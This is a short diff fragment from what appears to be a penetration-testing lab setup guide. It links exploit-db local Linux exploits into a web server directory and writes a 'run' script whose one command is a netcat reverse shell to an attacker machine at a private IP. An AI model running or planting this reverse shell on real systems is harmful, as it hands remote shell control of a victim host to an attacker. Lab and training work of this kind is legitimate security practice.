@@ -28,6 +28,7 @@ ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/
 # Create a run file we will need later 
 vi /var/www/html/run
 # ip will be the ip of our kali-server 
+
 #!/bin/bash
 nc 192.168.10.169 12345 -e /bin/bash
 
